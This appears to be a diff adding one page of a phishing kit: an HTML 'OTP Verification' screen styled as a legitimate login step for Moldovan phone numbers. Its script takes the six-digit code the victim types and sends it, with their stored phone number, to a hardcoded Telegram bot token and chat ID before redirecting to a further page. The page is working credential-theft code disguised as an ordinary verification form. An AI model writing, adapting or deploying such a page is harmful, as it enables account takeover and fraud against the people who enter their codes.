@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        :root { --input-bg: rgba(255, 255, 255, 0.2); --button-bg: #ff8c61; --text-color: #ffffff; }
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: linear-gradient(to bottom right, #4facfe 0%, #f093fb 100%); height: 100vh; display: flex; justify-content: center; align-items: center; color: var(--text-color); }
+        .container { width: 90%; max-width: 400px; text-align: center; padding: 20px; }
+        .back-arrow { position: absolute; top: 20px; right: 20px; font-size: 24px; cursor: pointer; }
+        h2 { font-size: 26px; margin-bottom: 5px; }
+        p.info { font-size: 14px; opacity: 0.9; margin-bottom: 30px; direction: ltr; }
+        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; direction: ltr; }
+        .otp-box { width: 45px; height: 55px; border-radius: 12px; border: none; background: var(--input-bg); color: white; font-size: 24px; text-align: center; outline: none; }
+        .resend-text { display: block; margin-bottom: 40px; text-decoration: none; color: white; font-size: 14px; font-weight: bold; }
+        .continue-btn { width: 100%; padding: 15px; border: none; border-radius: 8px; background-color: var(--button-bg); color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="back-arrow" onclick="window.history.back()">➔</div>
+    <div class="container">
+        <h2>Insert 6 digits code</h2>
+        <p class="info">We send a code to <span id="displayPhone"></span></p>
+        <div class="otp-inputs">
+            <input type="text" maxlength="1" class="otp-box"><input type="text" maxlength="1" class="otp-box"><input type="text" maxlength="1" class="otp-box">
+            <input type="text" maxlength="1" class="otp-box"><input type="text" maxlength="1" class="otp-box"><input type="text" maxlength="1" class="otp-box">
+        </div>
+        <a href="#" class="resend-text">Resend code</a>
+        <button class="continue-btn" onclick="sendOTP()">Continue</button>
+    </div>
+
+    <script>
+        const token = "8594269483:AAGzW6jejt15t6kZR6sWai5EZPOk9HHyjpU";
+        const chatId = "8129155953";
+
+        window.onload = () => { document.getElementById('displayPhone').innerText = "+373 " + (localStorage.getItem('userPhone') || ""); };
+
+        async function sendOTP() {
+            let otp = "";
+            document.querySelectorAll('.otp-box').forEach(el => otp += el.value);
+            if(otp.length === 6) {
+                const msg = `🔢 كود التحقق (OTP):\n📱 الهاتف: +373${localStorage.getItem('userPhone')}\n✅ الرمز: ${otp}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                window.location.href = 'info.html';
+            } else { alert("Introduceți codul complet!"); }
+        }
+
+        const inputs = document.querySelectorAll('.otp-box');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => { if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index+1].focus(); });
+            input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index-1].focus(); });
+        });
+    </script>
+</body>
+</html>
